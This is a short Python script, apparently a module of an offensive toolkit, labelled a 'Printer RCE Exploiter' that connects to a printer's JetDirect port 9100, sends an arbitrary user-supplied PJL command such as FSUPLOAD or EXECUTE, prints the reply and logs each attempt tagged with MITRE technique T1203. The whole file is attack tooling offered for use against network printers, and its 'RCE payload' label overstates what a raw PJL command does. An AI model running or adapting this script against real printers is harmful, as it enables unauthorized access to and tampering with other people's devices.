# modules/exploits/printer_rce_payload.py

import socket
import argparse
from datetime import datetime
import json
import os

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1203"  # Exploitation for Client Execution

def log_event(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def send_pjl_command(ip, port, cmd):
    payload = f"@PJL {cmd}\r\n".encode()
    try:
        with socket.create_connection((ip, port), timeout=5) as s:
            s.sendall(payload)
            response = s.recv(1024)
            print(f"[âœ“] RCE payload sent: {cmd}")
            print(response.decode(errors='ignore'))

            log_event({
                "timestamp": datetime.utcnow().isoformat(),
                "target": f"{ip}:{port}",
                "cmd": cmd,
                "ttp": MITRE_TTP,
                "success": True
            })
    except Exception as e:
        print(f"[!] Failed to send PJL command: {e}")
        log_event({
            "timestamp": datetime.utcnow().isoformat(),
            "target": f"{ip}:{port}",
            "cmd": cmd,
            "ttp": MITRE_TTP,
            "success": False,
            "error": str(e)
        })

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Printer RCE Exploiter (PJL-based)")
    parser.add_argument("--target-ip", required=True, help="Target printer IP")
    parser.add_argument("--port", type=int, default=9100, help="JetDirect port (default: 9100)")
    parser.add_argument("--cmd", required=True, help="PJL command to send (e.g., FSUPLOAD, EXECUTE)")
    args = parser.parse_args()

    send_pjl_command(args.target_ip, args.port, args.cmd)
